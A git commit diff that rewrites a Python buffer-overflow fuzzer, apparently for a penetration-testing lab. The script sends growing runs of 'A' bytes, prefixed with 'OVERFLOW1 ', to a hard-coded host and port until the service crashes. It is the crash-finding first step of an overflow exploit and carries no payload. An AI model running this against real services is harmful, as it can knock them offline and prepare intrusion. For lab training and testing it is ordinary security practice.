68c076234ea586232de01587ed941d1086513287
x4n-pentest <x4n1993@gmail.com>
2025-02-02 11:45:08 +0100

    Update fuzzer.py

--- fuzzer.py
+++ fuzzer.py
@@ -1,26 +1,26 @@
-import socket
-import time
+#!/usr/bin/env python3
 
-def fuzz(target_ip, target_port, prefix=b"", start_length=100, step=100, max_length=5000):
-    buffer = prefix + b"A" * start_length
-    
-    while len(buffer) <= max_length:
-        try:
-            print(f"[*] Sending {len(buffer)} bytes...")
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
-            s.connect((target_ip, target_port))
-            s.send(buffer + b"\r\n")
-            s.close()
-            
-            time.sleep(1)
-            buffer += b"A" * step
-        except Exception as e:
-            print(f"[!] Crash bei {len(buffer)} Bytes!")
-            print(f"Fehler: {e}")
-            break
+import socket, time, sys
 
-if __name__ == "__main__":
-    target_ip = "192.168.1.100"
-    target_port = 9999
-    fuzz(target_ip, target_port)
+ip = "10.10.187.40"
+port = 1337
+
+timeout = 5
+prefix = "OVERFLOW1 "
+
+string = prefix + "A" * 100
+
+while True:
+  try:
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+      s.settimeout(timeout)
+      s.connect((ip, port))
+      s.recv(1024)
+      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
+      s.send(bytes(string, "latin-1"))
+      s.recv(1024)
+  except:
+    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
+    sys.exit(0)
+  string += 100 * "A"
+  time.sleep(1)
